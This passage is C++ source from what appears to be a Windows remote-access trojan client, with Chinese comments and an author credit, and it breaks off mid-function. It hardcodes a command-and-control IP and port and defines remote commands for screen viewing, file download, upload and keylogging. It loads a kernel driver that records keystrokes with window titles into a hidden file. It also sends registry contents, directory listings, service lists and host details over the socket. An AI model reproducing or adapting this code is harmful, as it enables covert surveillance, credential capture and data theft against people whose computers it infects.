
// pjv2.0Dlg.cpp : 实现文件
//
/******************************
注意，所有dll于sys和exe放在同一个
文件夹里！
作者:缺德大教主
qq:2238115373
2020.8.3
********************************/
#include "stdafx.h"
#include "pjv2.0.h"
#include "pjv2.0Dlg.h"
#include "afxdialogex.h"
#include "Cmessg.h"
#include<winioctl.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <Windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include <cstring>
#include <fstream>
#include <conio.h>  
#include <winsock2.h>
using namespace std;
#include <TLHELP32.H>
#include <ntsecapi.h>
#include<atlimage.h>
#include<string>
#include <iostream>
#include<winsvc.h>
#include <Urlmon.h>
#pragma comment(lib, "urlmon.lib")
#pragma  comment(lib,"WS2_32.Lib")
#pragma comment(lib,"winmm")
#pragma comment(lib,"keyboard.lib")
char str1[] = "deskview";
char str2[] = "download";
char str3[] = "upload";
char str4[] = "exit";
char str5[] = "keyboard";
char str6[] = "clearkeyboard";
char str7[] = "tipmessagebox";
char zcm[] = "zcmingnb";
#include<Vfw.h>
#include<shlobj.h>
#pragma comment(lib,"Vfw32.lib")
#define IDSOURCE                        2
#define IDFORMAT                        3
#define IDDISPLAY                       4
#define IDCOMPRESSION                   5
#define IDSAVEPATH                      6
#define IDVIDEO							7
#define IDPHOTO                         40001
#define IDBEGINCAMERA                   40002
#define IDENDCAMERA                     40003
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
extern "C" _declspec(dllimport) bool installkeyhook();
extern "C" _declspec(dllimport) bool uninstallkeyhook();
int gi();
#define BUFFER_SIZE 10
int keysys = 0;
int killsys = 0;
SOCKET sclient;
HWND hWnd = NULL;
char internetip[20] = "";
string sysName;
HANDLE hMutex = NULL;
sockaddr_in serAddr;
#define MAX_SERVICE_SIZE 1024 * 64
#define MAX_QUERY_SIZE   1024 * 8
char ip[] = "192.168.8.112";//64.69.43.237
int PORT = 6666;//10870
#define MAX_KEY_LENGTH 255  
#define MAX_VALUE_NAME 16383
typedef struct _LOGININFO_
{
	char PCNAME[100];
	UINT m_CpuSpeed;			//CPU主频
	UINT m_MemContent;			//内存容量
	char m_SysType[50];				//操作系统类型
	UINT m_CpuCount;			//CPU数量
}LOGININFO, *LPLOGININFO;
const char* GetInternetIP()
{
	std::string Inernet_ip;
	Inernet_ip.resize(32);
	TCHAR szTempPath[_MAX_PATH] = { 0 }, szTempFile[MAX_PATH] = { 0 };
	std::string buffer;
	GetTempPath(MAX_PATH, szTempPath);
	UINT nResult = GetTempFileName(szTempPath, _T("~ex"), 0, szTempFile);
	int ret = URLDownloadToFile(NULL, _T("http://www.ipchicken.com"), szTempFile, BINDF_GETNEWESTVERSION, NULL);
	if (ret == S_FALSE)
		return "获取公网IP失败";
	FILE *fp;
	if (_wfopen_s(&fp, szTempFile, _T("rb")) != 0){
		return "获取公网IP失败";
	}
	fseek(fp, 0, SEEK_END);//得到文件大小
	int ilength = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	if (ilength>0)
	{
		buffer.resize(ilength);
		fread(&buffer[0], sizeof(TCHAR), ilength, fp);
		const char *p = strstr(buffer.c_str(), "Address:");
		p += 9;
		char ip[20] = "";
		char ip2[20] = "";
		strncpy(ip, p, 17);
		const char *p2 = strstr(ip, "<");
		int last = strlen(p2);
		strncpy(ip2, ip, 17 - last - 1);
		if (p == NULL)
		{
			//printf(ip2);
			return "获取公网IP失败";
		}
		fclose(fp);
		DeleteFile(_T("ip.ini"));
		return ip2;
	}
	else
	{
		fclose(fp);
		return "获取公网IP失败";
	}
}
#define WINVERSION_2012 4026541440 //Microsoft Windows Server 2012 R2 的BuildNumber号
#define WINVERSION_10 4026546233 //Microsoft Windows 10 的BuildNumber号
#define IOCTL1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define IOCTL2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x801,METHOD_BUFFERED,FILE_ANY_ACCESS)
int installDvr(char *drivernmae,CString servername)//安装
{
	char path[256] = "";
	GetCurrentDirectoryA(MAX_PATH, path);
	sprintf(path, "%s\\%s", path, drivernmae);
	CString cstringpath(path);
	//printf(path);
	SC_HANDLE schSCManager;
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager)
	{
		SC_HANDLE schService = CreateService(schSCManager,

			servername,

			servername,

			SERVICE_ALL_ACCESS,

			SERVICE_KERNEL_DRIVER, //创建的服务类型1为驱动服务

			SERVICE_DEMAND_START, //用于当有进程调用StartService 函数时由服务控制管理器(SCM)启动的服务。查询Starting Services on Demand以获取更多信息。

			SERVICE_ERROR_IGNORE,

			cstringpath,//驱动文件存放路径

			NULL,

			NULL,

			NULL,

			NULL,

			NULL);
		CloseServiceHandle(schService); //创建完记得释放句柄
		if (schService)
		{
			CloseServiceHandle(schSCManager);
			return 1;

		}
		else
		{
			CloseServiceHandle(schSCManager);
			return 0;
		}
		CloseServiceHandle(schSCManager);
	}
	return 0;

}
int startDvr(CString servername)//启动
{
	SC_HANDLE schSCManager;
	SC_HANDLE hs;
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager)
	{
		hs = OpenService(schSCManager, servername, SERVICE_ALL_ACCESS); //打开服务
		if (hs)
		{
			StartService(hs, 0, 0);
			printf("启动服务成功\n");
			return 1;
			CloseServiceHandle(hs);
		}
		CloseServiceHandle(schSCManager);
	}
	return 0;
}
void stopDvr(CString servername)//停止
{
	SC_HANDLE schSCManager;
	SC_HANDLE hs;
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager)
	{
		hs = OpenService(schSCManager, servername, SERVICE_ALL_ACCESS); //打开服务
		if (hs)
		{
			SERVICE_STATUS status;
			int num = 0;

			QueryServiceStatus(hs, &status);
			if (status.dwCurrentState != SERVICE_STOPPED && status.dwCurrentState != SERVICE_STOP_PENDING)
			{
				ControlService(hs, SERVICE_CONTROL_STOP, &status);
				do
				{
					Sleep(50);
					num++;
					QueryServiceStatus(hs, &status);
				} while (status.dwCurrentState != SERVICE_STOPPED || num>80);
			}

			if (num>80)
			{
				printf("停止服务失败\n");
			}
			else
			{
				printf("停止服务成功\n");
			}
			CloseServiceHandle(hs);
		}
		CloseServiceHandle(schSCManager);
	}

}
void unloadDvr(CString servername)//卸载
{
	SC_HANDLE schSCManager;
	SC_HANDLE hs;
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (schSCManager)
	{
		hs = OpenService(schSCManager, servername, SERVICE_ALL_ACCESS); //打开服务
		if (hs)
		{
			bool a = DeleteService(hs); //删除服务
			if (!a)
			{
				printf("删除服务失败\n");
			}
			else
			{
				printf("已删除服务\n");
			}

			CloseServiceHandle(hs);//释放完后可完服务可从服务表中消失 释放前是已禁止状态
		}
		CloseServiceHandle(schSCManager);
	}

}
// 安全的取得真实系统信息  
VOID SafeGetNativeSystemInfo(__out LPSYSTEM_INFO lpSystemInfo)
{
	if (NULL == lpSystemInfo)    return;
	typedef VOID(WINAPI *LPFN_GetNativeSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
	LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandle(_T("kernel32")), "GetNativeSystemInfo");;
	if (NULL != fnGetNativeSystemInfo)
	{
		fnGetNativeSystemInfo(lpSystemInfo);
	}
	else
	{
		GetSystemInfo(lpSystemInfo);
	}
}
// 获取操作系统位数  
int GetSystemBits()
{
	SYSTEM_INFO si;
	SafeGetNativeSystemInfo(&si);
	if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
		si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
	{
		return 64;
	}
	return 32;
}
/*
**	函数名称:	GetVideoInfo
**	函数功能:	取计算机视频信息
**	传入参数:	无
**	传出参数:	无
**	引用函数:	无
**	返回值	:	char(1-有视频 0-无视频)
**	备注	:
*/
int GetVideoInfo()
{
	HWND hCaphWnd = capCreateCaptureWindow(_T("Capture"), WS_POPUP, 0, 0, 1, 1, 0, 0);
	if (hCaphWnd == NULL) return 0;

	// Connect to webcam driver
	if (!capDriverConnect(hCaphWnd, 0))
	{
		return 0;
	}
	capDriverDisconnect(hCaphWnd);
	return 1;
}
/*
**函数：GetSystemName()
**功能：获取8.1以下版本操作系统名称
*/
void GetSystemName(string& osname)
{
	SYSTEM_INFO info;
	GetSystemInfo(&info);
	OSVERSIONINFOEX os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);

	osname = "Unknown Microsoft Windows Version";

	if (GetVersionEx((OSVERSIONINFO *)&os))
	{
		switch (os.dwMajorVersion)//判断主版本号  
		{
		case 4:
			switch (os.dwMinorVersion)//判断次版本号   
			{
			case 0:
				if (os.dwPlatformId == VER_PLATFORM_WIN32_NT)
					osname = "Microsoft Windows NT 4.0";
				else if (os.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
					osname = "Microsoft Windows 95";
				break;
			case 10:
				osname = "Microsoft Windows 98";
				break;
			case 90:
				osname = "Microsoft Windows Me";
				break;
			}
			break;

		case 5:
			switch (os.dwMinorVersion)
			{
			case 0:
				osname = "Microsoft Windows 2000";
				break;

			case 1:
				osname = "Microsoft Windows XP";
				break;

			case 2:
				if (os.wProductType == VER_NT_WORKSTATION
					&& info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
				{
					osname = "Microsoft Windows XP Professional x64 Edition";
				}
				else if (GetSystemMetrics(SM_SERVERR2) == 0)
					osname = "Microsoft Windows Server 2003";
				else if (GetSystemMetrics(SM_SERVERR2) != 0)
					osname = "Microsoft Windows Server 2003 R2";
				break;
			}
			break;

		case 6:
			switch (os.dwMinorVersion)
			{
			case 0:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Microsoft Windows Vista";
				else
					osname = "Microsoft Windows Server 2008";
				break;
			case 1:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Microsoft Windows 7";
				else
					osname = "Microsoft Windows Server 2008 R2";
				break;
			case 2:
				if (os.wProductType == VER_NT_WORKSTATION)
					osname = "Microsoft Windows 8";
				else
					osname = "Microsoft Windows Server 2012";
				break;
			}
			break;
		}
	}
}
/*
**函数：GetSystemNameUp()
**功能：获取8.1以上版本操作系统名称
*/
void GetSystemNameUp(string& vname)
{
	//先判断是否为win8.1或win10  
	typedef void(__stdcall*NTPROC)(DWORD*, DWORD*, DWORD*);
	HINSTANCE hinst = LoadLibrary(_T("ntdll.dll"));
	DWORD dwMajor, dwMinor, dwBuildNumber;
	NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	proc(&dwMajor, &dwMinor, &dwBuildNumber);
	//cout << "mainVersion:" << dwMajor << ";secondVersion:" << dwMinor << ";buildNumber:" << dwBuildNumber << endl;
	if (dwMajor == 6 && dwMinor == 3)   //win 8.1  
	{
		if (dwBuildNumber == WINVERSION_2012)
		{
			vname = "Microsoft Windows Server 2012 R2";
		}
		else
		{
			vname = "Microsoft Windows 8.1";
		}
		return;
	}
	else if (dwMajor == 10 && dwMinor == 0)  //win 10  
	{
		if (dwBuildNumber == WINVERSION_10)
		{
			vname = "Microsoft Windows 10";
		}
		else
		{
			vname = "Microsoft Windows Server 2016";
		}
		return;
	}
}
/*
**	函数名称:	getCpuSpeedFromRegistry
**	函数功能:	取计算机CPU主频
**	传入参数:	无
**	传出参数:	无
**	引用函数:	无
**	返回值	:	DWORD(计算机CPU主频)
**	备注	:	从注册表中取数据
*/
DWORD getCpuSpeedFromRegistry(void)
{
	HKEY hKey = NULL;
	LONG result = 0;
	result = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
		_T("Hardware\\Description\\System\\CentralProcessor\\0")
		, 0, KEY_QUERY_VALUE, &hKey);
	if (result != ERROR_SUCCESS)
		return 0;

	DWORD dwSpeed = 0;
	DWORD dwType = 0;
	DWORD dwSpeedSize;
	result = RegQueryValueEx(hKey, _T("~MHz"), NULL,
		NULL, (LPBYTE)& dwSpeed, &dwSpeedSize);
	if (result != ERROR_SUCCESS)
		dwSpeed = 0;

	RegCloseKey(hKey);
	return (dwSpeed);
}
int wr(int code)
{
	SYSTEMTIME sys;
	GetLocalTime(&sys);
	HWND hwnd = ::GetActiveWindow();
	if (hwnd == NULL)
	{
		hwnd = ::GetForegroundWindow();
		if (hwnd == NULL)
		{
			return 0;
		}
	}
	char title[256] = { 0 };
	GetWindowTextA(hwnd, title, 255);
	char key[10] = "";
	if (code == 1)
	{
		sprintf(key, "Esc");
	}
	else if (code == 57)
	{
		sprintf(key, "空格");
	}
	else if (code == 58)
	{
		sprintf(key, "Caps Lock");
	}
	else if (code == 42)
	{
		sprintf(key, "Shift");
	}
	else if (code == 29)
	{
		sprintf(key, "Ctrl");
	}
	else if (code == 63)
	{
		sprintf(key, "F5");
	}
	else if (code == 14)
	{
		sprintf(key, "Backspace");
	}
	else if (code == 11)
	{
		sprintf(key, "0");
	}
	else if (2 <= code&&code <= 10)
	{
		sprintf(key, "%d", code - 1);
	}
	else if (code == 16)
	{
		sprintf(key, "q");
	}
	else if (code == 17)
	{
		sprintf(key, "w");
	}
	else if (code == 18)
	{
		sprintf(key, "e");
	}
	else if (code == 19)
	{
		sprintf(key, "r");
	}
	else if (code == 20)
	{
		sprintf(key, "t");
	}
	else if (code == 21)
	{
		sprintf(key, "y");
	}
	else if (code == 22)
	{
		sprintf(key, "u");
	}
	else if (code == 23)
	{
		sprintf(key, "i");
	}
	else if (code == 24)
	{
		sprintf(key, "o");
	}
	else if (code == 25)
	{
		sprintf(key, "p");
	}
	else if (code == 30)
	{
		sprintf(key, "a");
	}
	else if (code == 31)
	{
		sprintf(key, "s");
	}
	else if (code == 32)
	{
		sprintf(key, "d");
	}
	else if (code == 33)
	{
		sprintf(key, "f");
	}
	else if (code == 34)
	{
		sprintf(key, "g");
	}
	else if (code == 35)
	{
		sprintf(key, "h");
	}
	else if (code == 36)
	{
		sprintf(key, "j");
	}
	else if (code == 37)
	{
		sprintf(key, "k");
	}
	else if (code == 38)
	{
		sprintf(key, "l");
	}
	else if (code == 44)
	{
		sprintf(key, "z");
	}
	else if (code == 45)
	{
		sprintf(key, "x");
	}
	else if (code == 46)
	{
		sprintf(key, "c");
	}
	else if (code == 47)
	{
		sprintf(key, "v");
	}
	else if (code == 48)
	{
		sprintf(key, "b");
	}
	else if (code == 49)
	{
		sprintf(key, "n");
	}
	else if (code == 50)
	{
		sprintf(key, "m");
	}
	else if (code == 28)
	{
		sprintf(key, "Enter");
	}
	else if (code == 82)
	{
		sprintf(key, "0");
	}
	else if (code == 79)
	{
		sprintf(key, "1");
	}
	else if (code == 80)
	{
		sprintf(key, "2");
	}
	else if (code == 81)
	{
		sprintf(key, "3");
	}
	else if (code == 75)
	{
		sprintf(key, "4");
	}
	else if (code == 76)
	{
		sprintf(key, "5");
	}
	else if (code == 77)
	{
		sprintf(key, "6");
	}
	else if (code == 71)
	{
		sprintf(key, "7");
	}
	else if (code == 72)
	{
		sprintf(key, "8");
	}
	else if (code == 73)
	{
		sprintf(key, "9");
	}
	else
	{
		sprintf(key, "unknown");
	}
	FILE *fp = fopen("key.zcming", "ab+");//位置必须写死
	int len = 0;//文件信息
	fseek(fp, 0, SEEK_END);
	len = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	if (len>1000000)
	{
		fclose(fp);
		FILE *fc = fopen("key.zcming", "w");
		char bufferz[256] = { 0 };
		sprintf(bufferz, "%s---%s   %d-%d-%d,%d:%d \r\n", title, key, sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute);
		fwrite(bufferz, 1, strlen(bufferz), fc);
		fclose(fc);
		return 0;
	}
	char buffer[256] = { 0 };
	sprintf(buffer, "%s---%s   %d-%d-%d,%d:%d \r\n", title, key, sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute);
	fwrite(buffer, 1, strlen(buffer), fp);
	fclose(fp);
	return 0;
}
void driverkeyrecod()
{
	HANDLE handlek = CreateFileA("\\\\.\\MyDevice2_link", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	while (1)
	{
		if (handlek != INVALID_HANDLE_VALUE){
			break;
		}
		Sleep(100);
	}
	unsigned char buffer[50] = { 0 };
	unsigned char buffer2[50] = { 0 };
	DWORD len;
	sprintf((char*)buffer, "hello, driver\r\n");//fashong unload jieshu!!!!!!!!!!
	while (keysys==1)
	{
		if (DeviceIoControl(handlek, IOCTL2, buffer, strlen((char*)buffer), buffer2, 1, &len, NULL)){
			for (int i = 0; i < len; i++){
				if (buffer2[i] != 0)
				{
					wr(buffer2[i]);
				}

			}
		}
		Sleep(10);
	}
}
/* 0查询失败
   1没有服务
   2服务启动
   3服务停止*/
int servicecheck(CString servername)
{
	SC_HANDLE hSC = ::OpenSCManager(NULL,
		NULL, GENERIC_EXECUTE);
	if (hSC == NULL)
	{
		
		return 0;
	}
	SC_HANDLE hSvc = ::OpenService(hSC, servername,
		SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);
	if (hSvc == NULL)
	{
		::CloseServiceHandle(hSC);
		return 1;
	}
	SERVICE_STATUS status;
	if (::QueryServiceStatus(hSvc, &status) == FALSE)
	{
		::CloseServiceHandle(hSvc);
		::CloseServiceHandle(hSC);
		return 0;
	}
	//如果处于停止状态则启动服务，否则停止服务。
	if (status.dwCurrentState == SERVICE_RUNNING)
	{
		return 2;
	}
	else if (status.dwCurrentState == SERVICE_STOPPED)
	{
		
		return 3;
	}
	return 4;
}
/*
**	函数名称:	GetMySysInfo
**	函数功能:	取计算机相关信息
**	传入参数:	无
**	传出参数:	m_TransData	: 转为ASCII码的数据缓冲
**	引用函数:	无
**	返回值	:	无
**	备注	:
*/
LOGININFO GetMySysInfo()
{
	LOGININFO m_SysInfo = { 0 };
	//USES_CONVERSION;
	//取操作系统
	
	if (sysName=="")
	{
		sysName == "Unknow";
	}
	//cout << sysName << endl;
	strcpy(m_SysInfo.m_SysType, sysName.c_str());
	//取CPU信息
	SYSTEM_INFO	m_pSysInfo = { 0 };
	GetSystemInfo(&m_pSysInfo);
	m_SysInfo.m_CpuSpeed = getCpuSpeedFromRegistry();
	m_SysInfo.m_CpuCount = (UINT)m_pSysInfo.dwNumberOfProcessors;

	//取内存容量
	MEMORYSTATUS Buffer = { 0 };
	GlobalMemoryStatus(&Buffer);
	m_SysInfo.m_MemContent = Buffer.dwTotalPhys / 1024;

	gethostname(m_SysInfo.PCNAME, 100);


	return m_SysInfo;
}
char* TCHAR2char(TCHAR* tchStr)
{
	int iLen = 2 * wcslen(tchStr);//CString,TCHAR汉字算一个字符，因此不用普通计算长度 
	char* chRtn = new char[iLen + 1];
	wcstombs(chRtn, tchStr, iLen + 1);//转换成功返回为非负值 
	return chRtn;
}
void QueryKey(HKEY hKey, SOCKET sclient)
{
	char TT[10] = "";
	TCHAR    achKey[MAX_KEY_LENGTH];   // buffer for subkey name  
	DWORD    cbName;                   // size of name string   
	TCHAR    achClass[MAX_PATH] = TEXT("");  // buffer for class name   
	DWORD    cchClassName = MAX_PATH;  // size of class string   
	DWORD    cSubKeys = 0;               // number of subkeys   
	DWORD    cbMaxSubKey;              // longest subkey size   
	DWORD    cchMaxClass;              // longest class string   
	DWORD    cValues;              // number of values for key   
	DWORD    cchMaxValue;          // longest value name   
	DWORD    cbMaxValueData;       // longest value data   
	DWORD    cbSecurityDescriptor; // size of security descriptor   
	FILETIME ftLastWriteTime;      // last write time   
	DWORD i, retCode;
	TCHAR  achValue[MAX_VALUE_NAME];
	DWORD cchValue = MAX_VALUE_NAME;
	retCode = RegQueryInfoKey(
		hKey,                    // key handle   
		achClass,                // buffer for class name   
		&cchClassName,           // size of class string   
		NULL,                    // reserved   
		&cSubKeys,               // number of subkeys   
		&cbMaxSubKey,            // longest subkey size   
		&cchMaxClass,            // longest class string   
		&cValues,                // number of values for this key   
		&cchMaxValue,            // longest value name   
		&cbMaxValueData,         // longest value data   
		&cbSecurityDescriptor,   // security descriptor   
		&ftLastWriteTime);       // last write time   
	if (cSubKeys)
	{
		for (i = 0; i < cSubKeys; i++)
		{
			cbName = MAX_KEY_LENGTH;
			retCode = RegEnumKeyEx(hKey, i,
				achKey,
				&cbName,
				NULL,
				NULL,
				NULL,
				&ftLastWriteTime);
			if (retCode == ERROR_SUCCESS)
			{
				send(sclient, TCHAR2char(achKey), 256, 0);
				recv(sclient, TT, 10, 0);
			}
		}

	}
	send(sclient, "finishc", 10, 0);
	recv(sclient, TT, 10, 0);
	if (cValues)
	{
		for (i = 0, retCode = ERROR_SUCCESS; i < cValues; i++)
		{
			DWORD dwType = REG_SZ;
			cchValue = MAX_VALUE_NAME;
			achValue[0] = '\0';
			retCode = RegEnumValue(hKey, i,
				achValue,
				&cchValue,
				NULL,
				&dwType,
				NULL,
				NULL);

			if (retCode == ERROR_SUCCESS)
			{
				send(sclient, TCHAR2char(achValue), 256, 0);
				recv(sclient, TT, 10, 0);
				if (dwType == REG_SZ || dwType == REG_EXPAND_SZ || dwType == REG_MULTI_SZ)
				{
					WCHAR szLocation[MAX_PATH] = { '\0' };
					DWORD dwSize = sizeof(DWORD);
					DWORD dwType = REG_SZ;
					RegQueryValueEx(hKey, achValue, 0, &dwType, NULL, &dwSize);
					RegQueryValueEx(hKey, achValue, 0, &dwType, (LPBYTE)&szLocation, &dwSize);
					send(sclient, TCHAR2char(szLocation), 256, 0);
					recv(sclient, TT, 10, 0);
					//m_List.SetItemText(0, 1, szLocation);
				}
				else
				{
					//m_List.SetItemText(0, 1, _T("我不想加载了，反正这个你也看不懂"));
					send(sclient, "我不想加载了，反正这个你也看不懂", 256, 0);
					recv(sclient, TT, 10, 0);
				}
			}
		}
	}
	send(sclient, "finishc", 10, 0);
	recv(sclient, TT, 10, 0);
	RegCloseKey(hKey);

}
void view(const CString& strpath, SOCKET sclient);
typedef struct tagDRIVER
{
	// （1）磁盘盘符
	wchar_t disk;
	// （2）磁盘总的大小
	double all;
	// （3）磁盘可用空间
	double free;
	// （4）磁盘类型（是光盘、硬盘、还是移动硬盘）
	int type;
}DRIVER;
void show(const CString& strpath, SOCKET sclient)
{
	USES_CONVERSION;
	char Te[20] = "";
	CFileFind filefind;
	CString str = strpath + _T("/*");
	BOOL d = filefind.FindFile(str);
	while (d)
	{
		d = filefind.FindNextFile();
		CString strname = filefind.GetFileName();
		if (!filefind.IsDirectory() || filefind.IsDots())
		{
			continue;
		}
		send(sclient, T2A(strname), 256, 0);
		recv(sclient, Te, 20, 0);
	}
	send(sclient, "finish", 10, 0);
	recv(sclient, Te, 20, 0);
	view(strpath, sclient);
}
void view(const CString& strpath, SOCKET sclient)
{
	USES_CONVERSION;
	char Te[20] = "";
	CFileFind filefind;
	//CString save = strpath;
	CString str = strpath + _T("/*");
	BOOL d = filefind.FindFile(str);
	while (d)
	{
		d = filefind.FindNextFile();
		CString strname = filefind.GetFileName();
		if (filefind.IsDirectory() || filefind.IsDots())
		{
			continue;
		}
		send(sclient, T2A(strname), 256, 0);
		recv(sclient, Te, 20, 0);
	}
	send(sclient, "finish", 10, 0);
	recv(sclient, Te, 20, 0);
}
void fileview(SOCKET sclient);
void cleanBuff(SOCKET sock_conn){
	// 设置select立即返回
	timeval time_out;
	time_out.tv_sec = 0;
	time_out.tv_usec = 0;
	// 设置select对sock_conn的读取感兴趣
	fd_set read_fds;
	FD_ZERO(&read_fds);
	FD_SET(sock_conn, &read_fds);

	int res = -1;
	char recv_data[2];
	memset(recv_data, 0, sizeof(recv_data));
	while (true){
		res = select(FD_SETSIZE, &read_fds, nullptr, nullptr, &time_out);
		if (res == 0) break;  //数据读取完毕，缓存区清空成功
		recv(sock_conn, recv_data, 1, 0);  //触发数据读取
	}
}
const char* path(SC_HANDLE SCMan, LPENUM_SERVICE_STATUS service_status, int i, DWORD ResumeHandle);
const char* starttpy(SC_HANDLE SCMan, LPENUM_SERVICE_STATUS service_status, int i, DWORD ResumeHandle)
{
	LPQUERY_SERVICE_CONFIG lpServiceConfig = NULL;                //服务详细信息结构
	SC_HANDLE service_curren = NULL;                            //当前的服务句柄
	service_curren = OpenService(SCMan, service_status[i].lpServiceName, SERVICE_QUERY_CONFIG);            //打开当前服务
	lpServiceConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, MAX_QUERY_SIZE);                        //分配内存， 最大为8kb 

	if (NULL == QueryServiceConfig(service_curren, lpServiceConfig, MAX_QUERY_SIZE, &ResumeHandle)) {
		return 0;
	}
	int typ = (int)lpServiceConfig->dwStartType;
	if (typ==2)
	{
		CloseServiceHandle(service_curren);
		return "自动";
	}
	else if (typ==3)
	{
		CloseServiceHandle(service_curren);
		return "手动";
	}
	else if (typ == 4)
	{
		CloseServiceHandle(service_curren);
		return "禁用";
	}
	else
	{
		CloseServiceHandle(service_curren);
		return "未知";
	}
	return "错误";
	//return ConvertLPWSTRToLPSTR(lpServiceConfig->lpBinaryPathName);
}
char* ConvertLPWSTRToLPSTR(LPWSTR lpwszStrIn)

{

	LPSTR pszOut = NULL;

	try

	{

		if (lpwszStrIn != NULL)

		{

			int nInputStrLen = wcslen(lpwszStrIn);

			// Double NULL Termination 

			int nOutputStrLen = WideCharToMultiByte(CP_ACP, 0, lpwszStrIn, nInputStrLen, NULL, 0, 0, 0) + 2;

			pszOut = new char[nOutputStrLen];

			if (pszOut)

			{

				memset(pszOut, 0x00, nOutputStrLen);

				WideCharToMultiByte(CP_ACP, 0, lpwszStrIn, nInputStrLen, pszOut, nOutputStrLen, 0, 0);

			}

		}

	}

	catch (std::exception e)

	{

	}

	return pszOut;

}
const char* path(SC_HANDLE SCMan, LPENUM_SERVICE_STATUS service_status, int i, DWORD ResumeHandle)
{
	LPQUERY_SERVICE_CONFIG lpServiceConfig = NULL;                //服务详细信息结构
	SC_HANDLE service_curren = NULL;                            //当前的服务句柄
	service_curren = OpenService(SCMan, service_status[i].lpServiceName, SERVICE_QUERY_CONFIG);            //打开当前服务
	lpServiceConfig = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR, MAX_QUERY_SIZE);                        //分配内存， 最大为8kb 

	if (NULL == QueryServiceConfig(service_curren, lpServiceConfig, MAX_QUERY_SIZE, &ResumeHandle)) {
		return 0;
	}
	CloseServiceHandle(service_curren);
	return ConvertLPWSTRToLPSTR(lpServiceConfig->lpBinaryPathName);
}
int server(SOCKET sclient)
{
	send(sclient, "mserver", 15, 0);
	char cst[20] = "";
	recv(sclient, cst, 19, 0);
	if (strcmp(cst, "wrong") == 0)
	{
		
		return 0;
	}
	//servercheck(sclient);
	char test[20] = "";
	do {
		SC_HANDLE SCMan = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		if (SCMan == NULL) {
			MessageBoxA(0, "2", "1", 0);
			return 0;
			break;
		}
		LPENUM_SERVICE_STATUS service_status;
		DWORD cbBytesNeeded = NULL;
		DWORD ServicesReturned = NULL;
		DWORD ResumeHandle = NULL;

		service_status = (LPENUM_SERVICE_STATUS)LocalAlloc(LPTR, MAX_SERVICE_SIZE);


		BOOL ESS = EnumServicesStatus(SCMan,                        //句柄
			SERVICE_WIN32,                                            //服务类型
			SERVICE_STATE_ALL,                                        //服务的状态
			(LPENUM_SERVICE_STATUS)service_status,                    //输出参数，系统服务的结构
			MAX_SERVICE_SIZE,                                        //结构的大小
			&cbBytesNeeded,                                            //输出参数，接收返回所需的服务
			&ServicesReturned,                                        //输出参数，接收返回服务的数量
			&ResumeHandle);                                            //输入输出参数，第一次调用必须为0，返回为0代表成功
		if (ESS == NULL) {
			return 0;
			break;
		}
		char name[256] = { 0 };
		char starttyp[30] = { 0 };
		char zt[50] = { 0 };
		for (int i = 0; i < static_cast<int>(ServicesReturned); i++) {
			strcpy(name, ConvertLPWSTRToLPSTR(service_status[i].lpDisplayName));
			send(sclient, name, 256, 0);
			recv(sclient, test, 20, 0);
			strcpy(starttyp, starttpy(SCMan, service_status, i, ResumeHandle));
			switch (service_status[i].ServiceStatus.dwCurrentState) { // 服务状态
			case SERVICE_CONTINUE_PENDING:
				sprintf(zt, "%s--%s", starttyp, "CONTINUE_PENDING");
				send(sclient, zt, 50, 0);
				recv(sclient, test, 20, 0);
				send(sclient, path(SCMan, service_status, i, ResumeHandle), 256, 0);
				recv(sclient, test, 20, 0);
				break;
			case SERVICE_PAUSE_PENDING:
				sprintf(zt, "%s--%s", starttyp, "PAUSE_PENDING");
				send(sclient, zt, 50, 0);
				recv(sclient, test, 20, 0);
				send(sclient, path(SCMan, service_status, i, ResumeHandle), 256, 0);
				recv(sclient, test, 20, 0);
				break;
			case SERVICE_PAUSED:
				sprintf(zt, "%s--%s", starttyp, "PAUSED");
				send(sclient, zt, 50, 0);
				recv(sclient, test, 20, 0);
				send(sclient, path(SCMan, service_status, i, ResumeHandle), 256, 0);
				recv(sclient, test, 20, 0);
				break;
			case SERVICE_RUNNING:
				sprintf(zt, "%s--%s", starttyp, "RUNNING");
				send(sclient, zt, 50, 0);
				recv(sclient, test, 20, 0);
				send(sclient, path(SCMan, service_status, i, ResumeHandle), 256, 0);
				recv(sclient, test, 20, 0);
				break;
			case SERVICE_START_PENDING:
				sprintf(zt, "%s--%s", starttyp, "START_PENDING");
				send(sclient, zt, 50, 0);
				recv(sclient, test, 20, 0);
				send(sclient, path(SCMan, service_status, i, ResumeHandle), 256, 0);
				recv(sclient, test, 20, 0);
				break;
			case SERVICE_STOPPED:
				sprintf(zt, "%s--%s", starttyp, "STOPPED");
